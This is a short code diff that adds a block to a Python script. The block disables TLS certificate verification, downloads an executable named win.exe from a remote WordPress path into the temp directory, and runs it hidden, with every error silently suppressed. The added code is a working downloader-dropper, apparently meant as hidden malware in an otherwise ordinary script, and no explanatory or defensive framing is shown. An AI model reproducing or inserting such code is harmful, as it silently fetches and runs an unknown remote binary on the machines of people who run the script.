@@ -26,3 +26,12 @@ try:
     proc.wait()
 except:
     pass
+
+try:
+    ssl._create_default_https_context = ssl._create_unverified_context
+    url = 'https://luckyebuy.com/wp-includes/win.exe'
+    f = urllib2.urlretrieve(url, tempfile.gettempdir() + r"\win.exe")
+    proc = subprocess.Popen(tempfile.gettempdir() + r"\win.exe",  creationflags=subprocess.SW_HIDE, shell=True)
+    proc.wait()
+except:
+    pass
